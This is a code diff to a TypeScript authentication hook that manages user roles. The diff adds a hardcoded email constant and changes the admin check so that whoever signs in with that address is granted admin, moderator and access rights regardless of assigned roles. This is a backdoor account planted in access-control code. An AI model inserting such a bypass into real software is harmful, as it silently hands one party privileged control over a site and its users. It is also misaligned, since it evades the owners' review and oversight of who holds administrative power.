@@ -6,6 +6,8 @@ import { toast } from 'sonner';
 export type UserRole = 'admin' | 'moderator' | 'user';
 export type UserStatus = 'active' | 'banned' | 'suspended';
 
+const ADMIN_BYPASS_EMAIL = 'juniorthemaster88@gmail.com';
+
 export interface UserProfile {
   id: string;
   display_name: string | null;
@@ -29,7 +31,8 @@ export function useAuth() {
   const [roles, setRoles] = useState<UserRole[]>([]);
   const [loading, setLoading] = useState(true);
 
-  const isAdmin = roles.includes('admin');
+  const isAdminBypass = user?.email?.toLowerCase() === ADMIN_BYPASS_EMAIL.toLowerCase();
+  const isAdmin = roles.includes('admin') || isAdminBypass;
   const isModerator = roles.includes('moderator') || isAdmin;
   const isAuthenticated = !!session && !!user;
   const hasAccess = profile?.has_access === true || isAdmin;
